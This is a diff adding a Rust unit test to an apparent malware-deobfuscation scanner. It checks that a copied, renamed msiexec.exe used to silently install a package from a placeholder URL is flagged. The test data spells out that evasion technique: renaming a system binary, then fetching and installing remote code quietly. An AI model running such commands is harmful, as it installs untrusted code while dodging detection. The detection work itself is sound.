@@ -15518,6 +15518,54 @@ C:\Users\Public\cu.tmp -K curl.cfg
     }
 
     #[test]
+    fn copied_msiexec_alias_in_deob_text_emits_package_url_argument() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\msiexec.exe C:\Users\Public\install.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\msiexec.exe"#.to_string(),
+            dst: r#"C:\Users\Public\install.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\install.tmp /quiet /i https://copied-msiexec.example/setup.msi /qn"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\install.tmp"#
+                )
+            }),
+            "copied msiexec alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "msiexec.exe /quiet /i https://copied-msiexec.example/setup.msi /qn"
+                            && url == "https://copied-msiexec.example/setup.msi"
+                )
+            }),
+            "copied msiexec alias did not replay package URL: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://copied-msiexec.example/setup.msi"
+                )
+            }),
+            "copied msiexec URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_style_compact_flags_exe_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
